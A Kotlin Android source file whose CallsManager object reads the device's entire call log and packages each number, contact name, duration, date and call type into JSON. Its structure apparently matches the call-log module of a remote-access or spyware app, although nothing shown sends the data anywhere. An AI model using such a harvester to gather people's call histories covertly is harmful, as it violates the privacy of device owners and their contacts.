package com.neaking

import android.annotation.SuppressLint
import android.net.Uri
import org.json.JSONObject
import org.json.JSONArray
import android.provider.CallLog
import org.json.JSONException

object CallsManager {
    @SuppressLint("Range")
    @JvmName("getCallsLogs1")
    fun getCallsLogs(): JSONObject? {
            try {
                val Calls = JSONObject()
                val list = JSONArray()
                val allCalls = Uri.parse("content://call_log/calls")
                val cur = MainService.getContextOfApplication()!!.contentResolver.query(
                    allCalls,
                    null,
                    null,
                    null,
                    null
                )
                while (cur!!.moveToNext()) {
                    val call = JSONObject()
                    val num = cur.getString(cur.getColumnIndex(CallLog.Calls.NUMBER))
                    val name = cur.getString(cur.getColumnIndex(CallLog.Calls.CACHED_NAME))
                    val duration = cur.getString(cur.getColumnIndex(CallLog.Calls.DURATION))
                    val date = cur.getString(cur.getColumnIndex(CallLog.Calls.DATE))
                    val type = cur.getString(cur.getColumnIndex(CallLog.Calls.TYPE)).toInt()
                    call.put("phoneNo", num)
                    call.put("name", name)
                    call.put("duration", duration)
                    call.put("date", date)
                    call.put("type", type)
                    list.put(call)
                }
                Calls.put("callsList", list)
                return Calls
            } catch (e: JSONException) {
                e.printStackTrace()
            }
            return null

    }


}